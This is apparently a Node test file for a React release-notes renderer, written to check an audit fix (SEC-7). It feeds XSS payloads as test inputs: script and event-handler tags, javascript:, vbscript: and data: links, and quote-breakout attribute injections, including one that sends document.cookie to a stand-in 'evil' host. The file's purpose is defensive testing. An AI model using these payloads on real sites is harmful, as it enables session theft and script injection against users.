// Release notes → React elements: `npm test` (node --test). Audit 2026-11 SEC-7.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { renderToStaticMarkup } from 'react-dom/server'
import { parseInline, parseNotes, renderNotes, safeHref } from './notes.ts'

const html = (src: string): string => renderToStaticMarkup(renderNotes(src))

/** Every href in the markup, decoded the way a browser reads the attribute. */
function hrefs(markup: string): string[] {
  return [...markup.matchAll(/<a href="([^"]*)"/g)].map((m) => m[1].replace(/&amp;/g, '&').replace(/&quot;/g, '"'))
}

/** Every attribute name on every tag in the markup. */
function attributeNames(markup: string): string[] {
  const names: string[] = []
  for (const tag of markup.matchAll(/<([a-z0-9]+)((?:\s+[a-z-]+="[^"]*")*)\s*\/?>/g)) {
    for (const a of tag[2].matchAll(/([a-z-]+)="/g)) names.push(a[1])
  }
  return names
}

/** The tags the renderer may produce — nothing a note writes can add another. */
const ALLOWED_TAGS = new Set(['h3', 'h4', 'h5', 'p', 'ul', 'li', 'strong', 'em', 'code', 'a'])

function assertInert(markup: string): void {
  for (const m of markup.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g)) assert.ok(ALLOWED_TAGS.has(m[1]), `unexpected tag <${m[1]}> in ${markup}`)
  for (const name of attributeNames(markup)) assert.ok(['href', 'target', 'rel'].includes(name), `unexpected attribute ${name} in ${markup}`)
  for (const h of hrefs(markup)) assert.match(h, /^https?:\/\/[^\s"]+$/, h)
  // No tag can be left half-open by a quote: every `<` that starts a tag closes before the next `<`.
  assert.equal(markup.replace(/<[a-z0-9]+(?:\s+[a-z-]+="[^"<>]*")*>|<\/[a-z0-9]+>/g, '').match(/[<>]/), null, markup)
}

test('the audit entry: a quote in a bare URL cannot leave the href (SEC-7)', () => {
  const markup = html(`- Fixed https://x.y/"autofocus/onfocus="location='https://evil/'+document.cookie`)
  assertInert(markup)
  assert.ok(!/ onfocus=/.test(markup) && !/ autofocus/.test(markup), markup)
  // The link stops at the quote; the rest is text (its own bare https URL is an ordinary, inert link).
  assert.deepEqual(hrefs(markup), ['https://x.y/', 'https://evil/'])
})

test('hostile entries stay text', () => {
  const entries = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '[click](javascript:alert(1))',
    '[click](JaVaScRiPt:alert(1))',
    '[click]( javascript:alert(1) )',
    '[click](data:text/html,<script>alert(1)</script>)',
    '[click](vbscript:msgbox(1))',
    '[click](//evil.example/x)',
    '[click](/relative)',
    '[x](https://ok.example/" onmouseover="alert(1))',
    '**<b onclick=alert(1)>bold</b>**',
    '`<iframe src=https://evil>`',
    '## <svg onload=alert(1)>',
    'https://ok.example/<script>alert(1)</script>',
    "https://ok.example/'onmouseover='alert(1)'",
    '<a href="javascript:alert(1)">x</a>',
    '&lt;script&gt; &amp; &quot;'
  ]
  for (const e of entries) {
    for (const src of [e, `- ${e}`, `### ${e}`, `para\n  ${e}`]) {
      const markup = html(src)
      assertInert(markup)
      assert.ok(!/javascript:|vbscript:|data:text/i.test(hrefs(markup).join(' ')), markup)
    }
  }
  // The words are kept, as text (escaped by React).
  assert.equal(html('<script>alert(1)</script>'), '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>')
  // The address goes (the label stays); a ")" inside it is left over as text.
  assert.equal(html('[click](javascript:alert(1))'), '<p>click)</p>')
  assert.equal(html('&lt;b&gt;'), '<p>&amp;lt;b&amp;gt;</p>')
})

test('safeHref: absolute http(s) only', () => {
  assert.equal(safeHref('https://github.com/Total-org/total-org/pull/239'), 'https://github.com/Total-org/total-org/pull/239')
  assert.equal(safeHref('http://example.com'), 'http://example.com/')
  for (const bad of ['javascript:alert(1)', 'JAVASCRIPT:alert(1)', 'data:text/html,x', 'mailto:a@b.c', '/docs', '//evil.example', 'https://', 'not a url', 'file:///etc/passwd'])
    assert.equal(safeHref(bad), null, bad)
})

test('the CHANGELOG shapes render as before (hand-written expected markup)', () => {
  const src = [
    '## [0.12.1] - 2026-11-08',
    '',
    'Everything since **0.12.0**; see the',
    '[releases page](https://github.com/Total-org/total-org/releases).',
    '',
    '### For shop owners',
    '',
    '- **Make a bill** (Sell). Pick a customer and save. A part payment',
    '  leaves the rest due. [#86](https://github.com/IrminFlow/total/pull/86)',
    '- Bare link https://irminflow.com/docs. Code `simple:post` and snake_case_name stay.',
    '  - A nested point.',
    '* _No notes for this release._'
  ].join('\n')
  assert.equal(
    html(src),
    '<h3>[0.12.1] - 2026-11-08</h3>' +
      '<p>Everything since <strong>0.12.0</strong>; see the <a href="https://github.com/Total-org/total-org/releases" target="_blank" rel="noopener noreferrer">releases page</a>.</p>' +
      '<h4>For shop owners</h4>' +
      '<ul>' +
      '<li><strong>Make a bill</strong> (Sell). Pick a customer and save. A part payment leaves the rest due. <a href="https://github.com/IrminFlow/total/pull/86" target="_blank" rel="noopener noreferrer">#86</a></li>' +
      '<li>Bare link <a href="https://irminflow.com/docs" target="_blank" rel="noopener noreferrer">https://irminflow.com/docs</a>. Code <code>simple:post</code> and snake_case_name stay.<ul><li>A nested point.</li></ul></li>' +
      '<li><em>No notes for this release.</em></li>' +
      '</ul>'
  )
})

test('unclosed markers stay literal', () => {
  assert.deepEqual(parseInline('**open and `tick and [label'), [{ t: 'text', v: '**open and `tick and [label' }])
  assert.deepEqual(parseNotes('#### Deep'), [{ t: 'h', level: 4, c: [{ t: 'text', v: 'Deep' }] }])
  assert.deepEqual(parseNotes('# Not a heading we use'), [{ t: 'p', c: [{ t: 'text', v: '# Not a heading we use' }] }])
})
